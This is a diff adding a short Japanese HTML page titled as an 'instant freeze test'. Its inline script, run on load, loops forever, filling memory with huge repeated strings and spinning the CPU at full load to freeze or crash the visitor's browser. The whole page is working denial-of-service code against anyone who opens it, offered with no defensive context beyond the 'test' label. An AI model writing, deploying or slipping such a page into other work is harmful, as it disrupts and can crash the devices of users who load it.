@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>即時フリーズテスト</title>
+</head>
+<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
+
+    <h1 style="color: red;">高負荷処理を実行しました</h1>
+    <p>すでにブラウザの限界まで負荷がかかっています。</p>
+
+    <script>
+        // ページの読み込みを待たず、スクリプトが読まれた瞬間に無限ループに突入
+        let data = [];
+        
+        while (true) {
+            // 1. メモリを圧倒的なスピードで食いつぶす
+            data.push("CRASH_TEST_DATA_LOAD_HEAVY_STRING_MAX_POWER".repeat(20000));
+            
+            // 2. CPUを一切休ませずに100%で回し続ける
+            let heavyCalc = Math.sin(Math.random()) * Math.cos(Math.random()) * Math.sqrt(99999999);
+        }
+    </script>
+
+</body>
+</html>
